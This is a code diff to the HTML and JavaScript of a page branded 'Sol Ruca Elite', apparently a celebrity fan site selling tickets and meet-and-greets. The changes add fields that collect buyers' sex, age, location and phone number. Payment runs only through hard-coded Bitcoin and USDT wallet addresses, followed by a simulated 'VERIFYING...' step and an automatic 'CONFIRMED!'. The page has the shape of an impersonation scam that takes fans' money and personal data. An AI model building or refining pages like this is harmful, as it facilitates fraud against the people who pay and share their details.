@@ -38,10 +38,12 @@
         
         .stat-card { border-left: 4px solid #fbbf24; padding-left: 15px; }
         
-        /* Mobile Scaling for Headers */
         @media (max-width: 768px) {
             .hero-title { font-size: 3.5rem !important; line-height: 1; }
         }
+
+        input, select { color: white; }
+        option { background: #111; color: white; }
     </style>
 </head>
 <body class="min-h-screen">
@@ -117,30 +119,10 @@
             </div>
         </section>
 
-        <section class="py-20 md:py-32 px-6 max-w-4xl mx-auto">
-            <h2 class="text-3xl md:text-4xl font-title text-center mb-16 md:mb-20 uppercase">Global Impact</h2>
-            <div class="space-y-12 relative border-l border-white/10 ml-4 md:ml-10 pl-8 md:pl-10">
-                <div class="relative">
-                    <div class="absolute -left-[41px] md:-left-[52px] top-0 w-5 h-5 md:w-6 md:h-6 bg-yellow-500 rounded-full border-4 border-[#050505]"></div>
-                    <h4 class="font-title text-sm md:text-base text-yellow-500">Phase 01: The Launch</h4>
-                    <p class="text-gray-400 mt-2 text-sm md:text-base">Dominating the regional circuits and establishing the Sol Ruca brand.</p>
-                </div>
-                <div class="relative">
-                    <div class="absolute -left-[41px] md:-left-[52px] top-0 w-5 h-5 md:w-6 md:h-6 bg-white rounded-full border-4 border-[#050505]"></div>
-                    <h4 class="font-title text-sm md:text-base">Phase 02: Expansion</h4>
-                    <p class="text-gray-400 mt-2 text-sm md:text-base">Crossing borders into international territories and global main events.</p>
-                </div>
-            </div>
-        </section>
-
         <section class="py-20 md:py-32 bg-yellow-500 text-black text-center px-6">
             <h2 class="text-4xl md:text-6xl font-title mb-10 uppercase italic">Are you ready?</h2>
             <button onclick="openAuth('signup')" class="w-full md:w-auto bg-black text-white px-12 md:px-20 py-6 md:py-8 rounded-full font-black uppercase tracking-[0.2em] md:tracking-[0.3em] hover:scale-110 transition shadow-2xl">Join the Elite</button>
         </section>
-        
-        <footer class="py-10 text-center text-[10px] uppercase tracking-widest text-gray-600">
-            &copy; 2026 Sol Ruca Elite. All Rights Reserved.
-        </footer>
     </div>
 
     <div id="dashboard" class="hidden-section pt-24 md:pt-32 px-4 md:px-8 max-w-[1500px] mx-auto pb-20">
@@ -175,10 +157,7 @@
                         </div>
                     </div>
                 </div>
-                <div class="glass p-6 md:p-8 rounded-[40px]">
-                    <h3 class="text-center font-title text-sm mb-6 uppercase italic text-yellow-500">Tier Upgrades</h3>
-                    <div id="tier-container" class="space-y-4"></div>
-                </div>
+                <div id="tier-container" class="glass p-6 md:p-8 rounded-[40px] space-y-4"></div>
                 <button onclick="showDetails('Meet & Greet', 500, 'VIP', 'Global Tour', 'Exclusive Session.')" class="w-full py-6 md:py-8 bg-yellow-500 text-black font-black rounded-[30px] uppercase text-sm tracking-widest shadow-2xl hover:scale-105 transition">Request Meet & Greet</button>
             </div>
         </div>
@@ -198,21 +177,39 @@
                 <p id="total-price-display" class="text-3xl md:text-4xl font-black">$0</p>
                 <button onclick="nextStage()" class="w-full py-5 bg-yellow-500 text-black font-black rounded-2xl uppercase">Continue</button>
             </div>
+
             <div id="stage-form" class="hidden-section space-y-4 pt-6">
                 <h2 class="text-xl font-title text-center text-yellow-500 uppercase">Booking Info</h2>
                 <input type="text" placeholder="Full Name" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none">
                 <input type="email" placeholder="Email Address" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none">
+                <div class="grid grid-cols-2 gap-4">
+                    <select class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none">
+                        <option value="" disabled selected>Sex</option>
+                        <option value="male">Male</option>
+                        <option value="female">Female</option>
+                        <option value="other">Other</option>
+                    </select>
+                    <input type="number" placeholder="Age" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none">
+                </div>
+                <div class="grid grid-cols-2 gap-4">
+                    <input type="text" placeholder="Country" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none">
+                    <input type="text" placeholder="State" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none">
+                </div>
+                <input type="tel" placeholder="Phone Number" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none">
                 <button onclick="showStage('wallets')" class="w-full py-5 bg-yellow-500 text-black font-black rounded-2xl uppercase">Next</button>
             </div>
+
             <div id="stage-wallets" class="hidden-section space-y-4 pt-6">
                 <button onclick="showFinalWallet('BTC', 'bc1q4c6f7xzsekkpvd2guwkaww4m7se9yjlrxnrjc7')" class="w-full p-6 glass rounded-2xl font-bold uppercase">Bitcoin</button>
                 <button onclick="showFinalWallet('USDT', '0x08cfe6ddc3b58b0655dd1c9214bcfddbd3855cca')" class="w-full p-6 glass rounded-2xl font-bold uppercase">USDT (ERC20)</button>
             </div>
+
             <div id="stage-address" class="hidden-section text-center pt-6 space-y-6">
                 <div class="bg-white p-2 rounded-xl w-32 h-32 mx-auto"><img id="qr-img" src="" class="w-full"></div>
                 <p id="wallet-addr" class="text-[9px] font-mono break-all opacity-50"></p>
                 <button onclick="processFinal()" class="w-full py-5 bg-yellow-500 text-black font-bold rounded-xl">I HAVE SENT IT</button>
             </div>
+
             <div id="stage-loading" class="hidden-section py-10 text-center"><p class="animate-pulse font-title">VERIFYING...</p></div>
             <div id="stage-thankyou" class="hidden-section py-10 text-center"><h2 class="text-2xl font-title text-yellow-500">CONFIRMED!</h2><button onclick="closeModals()" class="mt-4 text-xs underline">Back to Vault</button></div>
         </div>
@@ -258,13 +255,8 @@
         
         function openAuth(m) { 
             document.getElementById('auth-modal').classList.remove('hidden-section'); 
-            if(m === 'login') {
-                document.getElementById('signup-box').classList.add('hidden-section');
-                document.getElementById('login-box').classList.remove('hidden-section');
-            } else {
-                document.getElementById('signup-box').classList.remove('hidden-section');
-                document.getElementById('login-box').classList.add('hidden-section');
-            }
+            document.getElementById('signup-box').classList.toggle('hidden-section', m === 'login');
+            document.getElementById('login-box').classList.toggle('hidden-section', m === 'signup');
         }
 
         function closeModals() { 
@@ -343,6 +335,7 @@
                 document.getElementById('nav-avatar').src = `https://ui-avatars.com/api/?name=${u.name}&background=fbbf24&color=000`;
                 document.getElementById('card-avatar').src = `https://ui-avatars.com/api/?name=${u.name}&background=333&color=fff`;
 
+                // TICKET BUTTON FIX: Used single quotes for JS string handling in onclick
                 document.getElementById('ticket-container').innerHTML = matches.map(m => `
                     <div class="glass p-5 rounded-3xl flex justify-between items-center border-white/5">
                         <div class="w-2/3">
